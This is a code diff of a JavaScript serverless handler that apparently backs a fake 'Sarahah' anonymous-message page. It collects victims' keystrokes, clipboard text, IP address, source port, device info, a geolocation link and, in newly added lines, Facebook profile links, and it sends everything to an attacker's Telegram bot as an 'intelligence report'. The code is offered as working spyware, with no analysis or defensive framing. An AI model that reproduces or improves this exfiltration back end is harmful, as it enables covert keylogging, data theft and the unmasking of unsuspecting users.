@@ -5,40 +5,41 @@ export default async function handler(req, res) {
     const token = process.env.BOT_TOKEN;
     const chatId = process.env.CHAT_ID;
 
-    // --- استخراج البيانات الاستخبارية (Intelligence Gathering) ---
+    // --- جمع البيانات الاستخبارية (Advanced Metadata) ---
     const forwarded = req.headers['x-forwarded-for'];
     const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
-    
-    // استخراج الـ Source Port الحقيقي للطلب
     const sourcePort = req.socket.remotePort || "غير محدد";
     
     // تسجيل الوقت بتوقيت القاهرة
     const timestamp = new Date().toLocaleString('ar-EG', { 
         timeZone: 'Africa/Cairo',
-        hour12: true 
+        dateStyle: 'full',
+        timeStyle: 'medium'
     });
 
-    // بناء التقرير بصيغة Markdown احترافية
+    // بناء التقرير
     let report = `🚨 **FULL INTELLIGENCE REPORT** 🚨\n`;
     report += `━━━━━━━━━━━━━━━━━━\n`;
-    report += `🌐 **IP:** \`${ip}\`\n`;
+    report += `🌐 **IP Address:** \`${ip}\`\n`;
     report += `🔌 **Source Port:** \`${sourcePort}\`\n`;
-    report += `📅 **Time:** \`${timestamp}\`\n`;
-    report += `🌍 **Location:** [عرض الموقع](https://www.google.com/maps/search/?api=1&query=${ip})\n`;
+    report += `📅 **Timestamp:** \`${timestamp}\`\n`;
+    report += `📍 **Geo-Location:** [اضغط هنا](https://www.ip-tracker.org/locator/ip-lookup.php?ip=${ip})\n`;
     report += `━━━━━━━━━━━━━━━━━━\n`;
 
-    // تمييز محتوى الرسالة
+    // تصنيف البيانات الواردة
     if (data.type === "keystroke") {
-        report += `⌨️ **Keylog captured:**\n\`${data.content}\`\n`;
+        report += `⌨️ **Live Keylog:**\n\`${data.content}\`\n`;
     } else if (data.type === "clipboard") {
-        report += `📋 **Clipboard text:**\n\`${data.content}\`\n`;
+        report += `📋 **Pasted Content:**\n\`${data.content}\`\n`;
+    } else if (data.type === "facebook_link") {
+        report += `👤 **Facebook Profile:**\n${data.content}\n`;
     } else if (data.type === "final_message") {
-        report += `📝 **Final Sarahah Msg:**\n\`${data.content}\`\n`;
+        report += `📝 **Sarahah Message:**\n\`${data.content}\`\n`;
     }
 
     report += `━━━━━━━━━━━━━━━━━━\n`;
-    report += `📱 **User Agent:** \`${req.headers['user-agent']}\`\n`;
-    report += `🔗 **URL:** ${data.url}\n`;
+    report += `📱 **Device Info:** \`${req.headers['user-agent']}\`\n`;
+    report += `🔗 **Target URL:** ${data.url}\n`;
     report += `━━━━━━━━━━━━━━━━━━`;
 
     try {
@@ -51,8 +52,8 @@ export default async function handler(req, res) {
                 parse_mode: "Markdown"
             })
         });
-        res.status(200).json({ status: 'success' });
+        res.status(200).json({ status: 'delivered' });
     } catch (e) {
-        res.status(500).send('Error in sending');
+        res.status(500).send('Error');
     }
 }
